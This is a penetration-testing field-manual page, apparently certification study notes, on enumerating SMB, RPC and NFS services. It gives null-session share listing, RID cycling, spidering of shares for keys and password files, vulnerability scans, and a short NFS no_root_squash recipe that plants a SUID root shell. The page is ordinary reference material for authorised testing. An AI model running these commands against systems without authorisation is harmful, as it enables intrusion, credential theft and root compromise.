---
title: "SMB, RPC, and NFS"
description: "Share enumeration, null sessions, RPC queries, SMB signing checks, and NFS export abuse."
category: "Field Manual"
tags: ["field-manual", "cpts", "smb", "rpc", "nfs", "enumeration"]
date: 2026-11-11
published: true
status: archive
---

# SMB, RPC, and NFS

## SMB (139, 445)

### Cheatsheet

```bash
nmap -p139,445 -sV --script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-security-mode,smb2-security-mode,smb2-time $IP
nxc smb $IP -u '' -p '' --shares --users --groups --pass-pol
smbclient -L //$IP -N
smbclient //$IP/share -N
smbmap -H $IP -u guest -p ''
rpcclient -U '' -N $IP
```

| Command | Description |
|---|---|
| `samrdump.py <FQDN/IP>` | Enumerate users and account metadata through Impacket's SAMR client. |
| `smbmap -H <FQDN/IP>` | Compare SMBMap's unauthenticated share-permission results with guest access. |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerate shares with the legacy CrackMapExec null-session syntax. |
| `enum4linux-ng.py <FQDN/IP> -A` | Collect SMB dialects, RPC users/groups, shares, and policies. |

Some distributions install `samrdump.py` as `impacket-samrdump`. NetExec (`nxc`) is used in the existing examples; the CrackMapExec row is useful on older toolsets. Compare tools' results with direct share access when they disagree about permissions.

### Methodology

- [ ] OS, hostname, domain, SMB version.
- [ ] Null/guest session; list shares and permissions.
- [ ] Signing required? (`smb2-security-mode`, `nxc smb --gen-relay-list`)
- [ ] Read every accessible share, including hidden (`C$`, `IPC$`, custom).
- [ ] Check write access; upload a harmless canary.
- [ ] Spider for configs, scripts, backups, `.kdbx`, `.ovpn`, `id_rsa`, `web.config`, `*.bak`.
- [ ] Enumerate users/groups via RPC or RID cycling.
- [ ] Check known vulnerabilities only after version confirmation (MS17-010, MS08-067, SambaCry).

### Authenticated access

```bash
nxc smb $IP -u "$USER" -p "$PASS" -d $DOMAIN --shares --users --groups --sessions --loggedon-users
nxc smb $IP -u "$USER" -p "$PASS" --local-auth --shares
smbclient //$IP/share -U "$DOMAIN\\$USER%$PASS"
smbclient //$IP/share -U "$USER%$PASS" -W $DOMAIN
```

### Spidering and download

```bash
smbclient //$IP/share -N -c 'recurse ON; prompt OFF; mget *'
nxc smb $IP -u "$USER" -p "$PASS" -M spider_plus -o DOWNLOAD_FLAG=True
```

At the `smb: \>` prompt:

| Command | Description |
|---|---|
| `help` | List client commands available in this session. |
| `ls` | List the current remote directory. |
| `get prep-prod.txt` | Download a selected file. |
| `!ls` | List the local working directory without leaving smbclient. |
| `!cat prep-prod.txt` | Read the downloaded local file from the client session. |

Or mount:

```bash
mkdir -p /mnt/share
mount -t cifs //$IP/share /mnt/share -o username="$USER",password="$PASS",domain="$DOMAIN",vers=3.0
```

### RPC

```bash
rpcclient -U '' -N $IP
```

```text
enumdomusers
enumdomgroups
querydominfo
getdompwinfo
lsaquery
netshareenumall
srvinfo
queryuser 0x1f4
querygroup 0x200
lookupsids S-1-5-21-...
```

```bash
impacket-rpcdump @$IP
```

RPC is useful when SMB share listing is restricted but the SAMR/LSA interfaces are exposed.

Additional commands at the `rpcclient` prompt:

| Command | Description |
|---|---|
| `enumdomains` | Enumerate domains exposed by the server. |
| `netsharegetinfo notes` | Retrieve a share's server-side path, attributes, and security descriptor. |
| `querydispinfo` | Request display information for domain accounts when exposed. |
| `enumalsgroups domain` | Enumerate aliases in the domain SAM. |
| `enumalsgroups builtin` | Enumerate aliases in the built-in SAM. |

If user listing is restricted but individual RID queries work, enumerate a bounded range:

```bash
for rid in $(seq 500 1100); do
  rpcclient -N -U '' 10.10.10.20 -c "queryuser 0x$(printf '%x' "$rid")" | grep -E 'User Name|user_rid|group_rid'
done
```

The loop converts decimal RIDs to hexadecimal for `queryuser`. Use the returned `group_rid` with the existing `querygroup` command; user and group RIDs are different objects.

### Signing and relay readiness

```bash
nxc smb $IP -u "$USER" -p "$PASS" --gen-relay-list relay-targets.txt
nmap -p445 --script smb2-security-mode $IP
```

Hosts without required signing are relay candidates. Relay itself belongs to [[pending/field-manual/05-lateral-movement/windows-lateral-movement|Windows lateral movement]].

### Vulnerability checks

```bash
nmap -p445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2017-7494 $IP
nxc smb $IP -u '' -p '' -M ms17-010
```

Only exploit after confirming the exact build and patch level. A “VULNERABLE” script result can be a false positive.

### Samba configuration and sessions

With local access to the Samba host:

| Command | Description |
|---|---|
| `cat /etc/samba/smb.conf \| grep -v '^\s*[#;]'` | Inspect share definitions and global settings without comment lines. |
| `smbstatus` | Display active sessions, clients, shares, negotiated dialects, and signing/encryption state. |

| Setting | Enumeration implication |
|---|---|
| `workgroup`, `server string` | Domain/workgroup context and the advertised server description. |
| `path` | Maps a share name to its actual server-side directory. |
| `map to guest = bad user` | Unknown usernames may be mapped to the guest account. |
| `usershare allow guests = yes` | User-defined shares may allow guest access. |
| `guest ok = yes` | Permits guest access to the share. |
| `browseable = yes` | The share appears in enumeration; hidden shares can still be reachable by name. |
| `read only = no`, `writable = yes` | Enables share-level writes, still subject to filesystem permissions. |
| `create mask = 0777`, `directory mask = 0777` | Permissive creation masks can retain broad requested permissions. |
| `enable privileges = yes` | Honors privileges assigned to SIDs. |
| `logon script` | Names a logon script that can reveal workflow or path information. |
| `magic script`, `magic output` | Legacy script-execution/output settings; behavior depends on Samba version. |

SMB 2.0/2.1 generally correspond to Vista/Server 2008 and Windows 7/Server 2008 R2 generations; SMB 3.x adds features such as multichannel and encryption. Dialect support is a capability clue, not proof of the operating system.

## NFS (111, 2049)

### Cheatsheet

```bash
nmap -p111,2049 -sV --script nfs-ls,nfs-showmount,nfs-statfs $IP
showmount -e $IP
mkdir -p /mnt/nfs && mount -t nfs $IP:/export /mnt/nfs
```

| Command | Description |
|---|---|
| `sudo nmap 10.10.10.20 -p111,2049 -sV -sC --script rpcinfo` | Map RPC program numbers, versions, transports, and listening ports. |
| `mkdir -p ./target-NFS` | Create a local mount point for a discovered export. |
| `sudo mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o ro,nolock` | Mount the selected export read-only without remote file locking. |
| `tree ./target-NFS` | View the mounted directory structure. |
| `ls -l ./target-NFS` | Show ownership resolved through the local username/group database. |
| `ls -n ./target-NFS` | Show numeric UID/GID ownership for comparison with server identities. |
| `sudo umount ./target-NFS` | Unmount the export after leaving the mount point. |

`nolock` is useful with older exports when lock-manager traffic is unavailable. It does not change file permissions. A read-only client mount also does not establish that the server export is read-only.

### Methodology

- [ ] List exports (`showmount -e`).
- [ ] Mount every export read-only first; inspect permissions and ownership.
- [ ] Look for home directories, backups, source code, SSH keys, database dumps.
- [ ] Check for `no_root_squash` (root on client keeps UID 0 on server).
- [ ] Check for `no_all_squash` and weak export restrictions.
- [ ] If read-only, check whether a subdirectory is writable.
- [ ] If you can write a root-owned SUID binary via `no_root_squash`, execute it on the target.

### `no_root_squash` attack

On the attacker, as root:

```bash
mount -t nfs $IP:/export /mnt/nfs
cp /bin/bash /mnt/nfs/rootbash
chmod 4755 /mnt/nfs/rootbash
```

On the target:

```bash
/export/rootbash -p
```

### UID mismatch

If a share is readable but files are owned by another UID, create a local user with that UID or use `setuid` tooling:

```bash
useradd -u 1001 nfsuser
su nfsuser
```

### NFSv4 notes

NFSv4 may use a pseudo-filesystem rooted at `/`. Try `mount -t nfs4 $IP:/ /mnt/nfs`. Kerberos-secured exports require a ticket; check `sec=krb5*` options in `/etc/exports` if readable.

### Export configuration

| Command | Description |
|---|---|
| `cat /etc/exports` | Read configured export paths, allowed clients, and options on the NFS server. |
| `exportfs` | List the server's currently exported filesystems. |

| Export option | Meaning |
|---|---|
| `ro`, `rw` | Server-side read-only or read/write access. |
| `sync`, `async` | Reply after stable-storage writes, or permit earlier replies. |
| `secure` | Require a privileged client source port below 1024 for applicable requests. |
| `insecure` | Permit unprivileged client source ports as well. |
| `root_squash` | Map client UID/GID 0 to the anonymous identity. |
| `no_root_squash` | Preserve the client's root identity. |
| `no_subtree_check` | Disable subtree path checks for exported subdirectories. |
| `nohide` | Make an appropriately exported child filesystem visible through its parent. |

AUTH_SYS trusts numeric UID/GID credentials; the same number can map to different names on client and server. NFSv4 can still use AUTH_SYS, so its version alone does not imply Kerberos authentication. With root squashing, effective access follows the mapped anonymous identity and ordinary file permissions.

## Pitfalls

- SMB1-only hosts may need `--option='client min protocol=NT1'` in smbclient.
- `NT_STATUS_ACCESS_DENIED` on a share can mean valid share but no permission; try other shares and users.
- Guest access may be enabled but hide shares; use RPC and RID cycling.
- NFS mounts can hang; use `-o soft,timeo=10` in labs.
- Do not recursively download huge shares without checking size first.

## References

- [HackTricks — SMB](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html)
- [HackTricks — NFS](https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html)
- [NetExec wiki — SMB](https://www.netexec.wiki/smb-protocol/)
- [impacket](https://github.com/fortra/impacket)
